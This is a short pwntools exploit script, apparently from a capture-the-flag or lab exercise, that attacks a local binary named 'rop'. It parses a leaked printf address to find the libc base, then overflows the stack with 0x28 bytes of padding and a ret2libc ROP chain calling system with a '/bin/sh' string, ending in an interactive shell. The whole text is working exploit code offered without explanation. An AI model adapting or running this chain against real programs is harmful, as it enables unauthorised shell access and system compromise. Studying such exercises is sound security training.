from pwn import * #64

p = process("./rop")
p.recvuntil(b"0x")


offset = 0x61cc0
printf  = int(p.recvline()[:-1],16)
libc = printf - offset
pop_rdi = 0x00401203
system = libc + 0x522c0
ret = 0x40101a
bin = libc + 0x1b45bd

log.info('addres : '+ hex(printf))

payload = b'A'*0x28
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(bin)
payload += p64(system)


p.sendline(payload)
p.interactive()
